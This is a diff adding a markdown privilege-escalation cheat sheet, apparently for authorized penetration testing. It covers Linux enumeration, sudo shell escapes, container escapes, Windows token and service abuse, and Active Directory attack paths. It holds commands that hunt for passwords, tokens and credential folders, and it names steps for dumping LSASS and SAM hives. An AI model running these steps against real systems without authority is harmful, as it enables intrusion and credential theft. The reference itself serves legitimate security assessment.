+# Privilege escalation reference
+
+## Linux quick checks
+
+```bash
+# identity and policy
+id; sudo -n -l; cat /etc/sudoers 2>/dev/null; ls -la /etc/sudoers.d
+
+# SUID/SGID and capabilities
+find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
+getcap -r / 2>/dev/null
+
+# writable paths that matter
+find / -xdev -writable -type d 2>/dev/null | grep -Ev '^/(proc|sys|dev|tmp|run)'
+ls -la /opt /srv /usr/local/bin /etc/systemd/system
+
+# scheduled work
+crontab -l; ls -la /etc/cron.d /etc/cron.*; systemctl list-timers --all
+
+# data
+grep -rIl -E 'password|passwd|secret|token' /home /var/www /opt 2>/dev/null | head -50
+ls -la ~/.ssh ~/.aws ~/.config/gcloud ~/.docker 2>/dev/null
+```
+
+### Sudo patterns
+
+| Entry | Escape |
+| --- | --- |
+| `sudo vim`, `vi`, `nano` | `:!sh`, `:python3 import os; os.system('/bin/sh')` |
+| `sudo less`, `more`, `man` | `!sh` |
+| `sudo find` | `find . -exec /bin/sh \;` |
+| `sudo awk` | `awk 'BEGIN {system("/bin/sh")}'` |
+| `sudo env` | `env /bin/sh` |
+| `sudo tar` | checkpoint action executing a command |
+| `sudo systemctl` with a writable unit | replace `ExecStart` |
+| `sudo docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
+| `sudo ld.so`/`LD_PRELOAD` allowed | preload a constructor |
+
+### Capabilities
+
+`cap_setuid+ep` on a binary that can set uid, `cap_dac_read_search` for file reads, `cap_sys_admin` for mounts and namespace tricks, `cap_net_raw` for packet capture.
+
+### Containers
+
+```bash
+cat /proc/1/cgroup; ls -la /.dockerenv
+capsh --print
+mount | grep -E 'overlay|docker'
+```
+
+Escape candidates: privileged container with host device access, mounted `docker.sock`, `hostPath` mounts, `CAP_SYS_ADMIN` plus cgroup release agent, kernel vulnerabilities shared with the host.
+
+## Windows quick checks
+
+```powershell
+whoami /priv
+whoami /groups
+cmdkey /list
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+Get-ChildItem 'C:\Program Files','C:\Program Files (x86)','C:\' -ErrorAction SilentlyContinue |
+  ForEach-Object { $_.FullName }
+```
+
+| Signal | Meaning | Move |
+| --- | --- | --- |
+| `SeImpersonatePrivilege` | Service-account token impersonation | Potato-family exploit for the build |
+| `SeBackupPrivilege` | Raw read of protected files | Copy SAM/SYSTEM hives, then secretsdump |
+| `SeDebugPrivilege` | Process memory access | Dump LSASS, inspect privileged processes |
+| `SeTakeOwnershipPrivilege` | Take ownership of objects | Own a service binary or registry key |
+| Unquoted service path | Path with spaces | Place binary in an earlier path segment |
+| Writable service binary | ACL grants write | Replace and restart the service |
+| `AlwaysInstallElevated=1` | MSI runs elevated | Install a crafted MSI |
+| Autologon registry | Plaintext credentials | Read `DefaultUserName`/`DefaultPassword` |
+
+## Active Directory paths
+
+- **ACL abuse:** `GenericAll` on a user → reset password; on a computer → RBCD; on a group → add member; `WriteDACL` → grant DCSync; `ForceChangePassword` → change then authenticate.
+- **Delegation:** unconstrained → coerce DC authentication; constrained → S4U2Self/S4U2Proxy to allowed services; RBCD → control a computer object and configure `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+- **ADCS:** ESC1 (enrollee supplies subject), ESC2 (any purpose EKU), ESC3 (enrollment agent), ESC4 (template ACL), ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2), ESC8 (NTLM relay to HTTP enrollment), ESC11 (relay to ICPR).
+- **GPO:** write access to a GPO linked to the target OU → immediate policy push.
+- **Trusts:** SID history injection, trust key extraction, cross-forest Kerberoast.
+
+## Reporting hooks
+
+For each escalation: starting identity, misconfiguration or CVE, exact command, resulting identity, and the artifact proving it. A screenshot alone is weaker than captured command output with a timestamp.
